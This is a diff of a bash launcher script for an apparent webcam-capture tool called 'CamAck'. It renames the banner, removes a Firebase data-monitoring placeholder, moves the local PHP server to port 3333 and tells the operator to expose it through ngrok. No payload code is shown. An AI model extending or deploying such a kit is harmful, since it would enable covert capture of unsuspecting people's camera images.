@@ -14,8 +14,8 @@ echo '
          +dNMNmmMNy:.                      .:yNMmmNMNd+
          /hNNMddNMd:..                        ..:dMNddMNNh/
         +mNdNdmMMd.-.                          .-.dMMmdNdNm+
-       NNhNNdMMM:--`        GOD OF DEATH        --:MMMdNNyNN/
-      mMsdMhNMMd.--            SHIVA             --.dMMNhMdsMm:
+       NNhNNdMMM:--`        CAMACK TOOL       --:MMMdNNyNN/
+      mMsdMhNMMd.--                            --.dMMNhMdsMm:
      yMhoNMdMMMh-:-`                          `-:-hMMMdMNohMy:
      NN/hMMMMMMmshhhy+`                    `+yhhhsmMMMMMMh/NN//
     yMmdMNMMMMMMNy:----                    ----:yNMMMMMMNMdmMy-
@@ -24,7 +24,7 @@ echo '
   hMydMd:/MhMMM``.hMMMMMMMMNdyym``myydNMMMMMMMMh.``MMMhM/:dMdyMh-
   dMssMd++MhMMM/ `dyMMMNITIMMMMMMM::::MM NITIMMMyd` /MMMhM++dMssMd-
   dMdNMdmNMhNMMMo.:ssMMMMMMMMMy:MM:yMMMMMMMMMss:.oMMMNhMNmdMNdMd-
-  hMdMMmmMMddMMy   `./ydmmdmMs.mMMm.sMmdmmdy/.`   yMMddMMmmMMdMh-
+  hMdMMmmMMddMMd   `./ydmmdmMs.mMMm.sMmdmmdy/.`   yMMddMMmmMMdMh-
   sMmmMNdMMNhMM:`     `..-+/.:mMddMm:.//-..`     `:MMhNMMdNMmmMs-
     MMMMyNMMhMMs-`         ``+NN::NN+``         `-sMMhMMNyMMMMm//
        MMNmMMMMMdo:/osys:     `.--.`     :syso/:odMMMMMmmMMds+/
@@ -102,36 +102,21 @@ dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 }
 
-catch_data() {
-echo ""
-echo '
-     ---------------------------   
-   !   NEW DATA IN FIREBASE     ! 
-     ---------------------------   ' | lolcat
-}
-
-check_data() {
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Monitoring Firebase data,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-while [ true ]; do
-echo "Checking Firebase for new data..."
-# Since we're using Firebase, actual implementation would require Firebase CLI or API calls
-# This is just a placeholder notification
-sleep 10
-done 
-}
-
 server_start() {
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
 echo ""
-php -S localhost:5678 > /dev/null 2>&1 & 
+php -S localhost:3333 > /dev/null 2>&1 & 
 sleep 2
-echo "Localhost: http://127.0.0.1:5678"
+echo "Localhost: http://127.0.0.1:3333"
 echo ""
 echo "You have to start ngrok manually on port 3333 for external access"
-check_data
+echo ""
+echo "Visit http://127.0.0.1:3333 in your browser to use CamAck"
+echo ""
+echo "Press Ctrl+C to stop the server"
+wait
 }
 
 start_menu() {
